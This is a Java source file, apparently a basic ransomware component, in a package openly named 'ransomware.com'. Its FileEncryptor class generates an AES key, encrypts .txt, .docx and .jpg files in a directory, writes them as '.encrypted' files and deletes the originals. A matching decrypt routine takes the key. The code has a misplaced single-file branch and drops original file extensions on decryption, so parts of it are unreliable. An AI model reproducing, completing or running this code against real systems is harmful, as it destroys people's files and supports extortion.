package ransomware.com;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.nio.file.Files;
import java.io.File;
import java.nio.file.Paths;
import java.nio.file.Path;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;

public class FileEncryptor {

    private SecretKey secretKey;

    private static final List<String> allowedFileExtensions = Arrays.asList(".txt", ".docx", ".jpg");

    // Generate a new AES key
    public void generateKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        this.secretKey = keyGen.generateKey();
    }

    // Encrypt a specific file or all allowed files in a directory
    public void encryptSelectedFileOrFolder(String filePath) throws Exception {
          File file = new File(filePath);

          if(file.isDirectory()){
              // If it's a directory, encrypt all allowed files in the directory
              File[] files = file.listFiles();
              if(files!=null){
                   for(File f : files){
                        if(shouldEncrypt(f)){
                             encryptFile(f.getAbsolutePath());
                        }
                   }
              }else{
                  // If it's a single file, check if it should be encrypted
                  if(shouldEncrypt(file)){
                      encryptFile(filePath);
                  }else{
                      System.out.println("File type not supported for encryption.");
                  }
              }
          }
    }

    // Check if the file should be encrypted based on its extension
    private boolean shouldEncrypt(File file){
           String fileName = file.getName().toLowerCase();
           for(String ext:allowedFileExtensions){
                if (fileName.endsWith(ext)){
                    return true;
                }
           }
           return false;
    }

    // Encrypt a .txt or other allowed file and convert it to .encrypted file
    public void encryptFile(String filePath) throws Exception{
        Path inputPath = Paths.get(filePath);

        // Check if the file is already encrypted
        if(filePath.endsWith(".encrypted")){
            System.out.println("File is already encrypted.");
            return;
        }

        byte[] fileData = Files.readAllBytes(inputPath);

        // Initialize the cipher for encryption
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);

        // Encrypt the data
        byte[] encryptedData = cipher.doFinal(fileData);

        // Get the original file extension (e.g., .txt, .docx, .png) and replace it with .encrypted
        String encryptedFilePath = filePath.replaceFirst("\\.[^.]+$", "") + ".encrypted";
        Files.write(Paths.get(encryptedFilePath), encryptedData);

        // Optionally, delete the original file after encryption
        Files.delete(inputPath);
        System.out.println("File encrypted successfully: " + encryptedFilePath);
    }

    // Decrypt an .encrypted file and convert it back to a .txt file
    public void decryptFile(String encryptedFilePath, SecretKey secretKey) throws Exception {
        Path inputPath = Paths.get(encryptedFilePath);

        // Check if the file is already decrypted
        if (!encryptedFilePath.endsWith(".encrypted")) {
            System.out.println("File is already decrypted.");
            return;
        }


        byte[] encryptedData = Files.readAllBytes(inputPath);

        // Initialize the cipher for decryption
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);

        // Decrypt the data
        byte[] decryptedData = cipher.doFinal(encryptedData);

        // Restore the original file extension by removing .encrypted
        // Here we are assuming the original file had no extension before encryption
        String decryptedFilePath = encryptedFilePath.replaceFirst("\\.encrypted$", "");

        // Write the decrypted file
        Files.write(Paths.get(decryptedFilePath), decryptedData);

        // Optionally, delete the encrypted file after decryption
        Files.delete(inputPath);
        System.out.println("File decrypted successfully: " + decryptedFilePath);
    }

    // Getters and setters for the secret key
    public SecretKey getSecretKey() {
        return this.secretKey;
    }

    public void setSecretKey(SecretKey secretKey) {
        this.secretKey = secretKey;
    }
}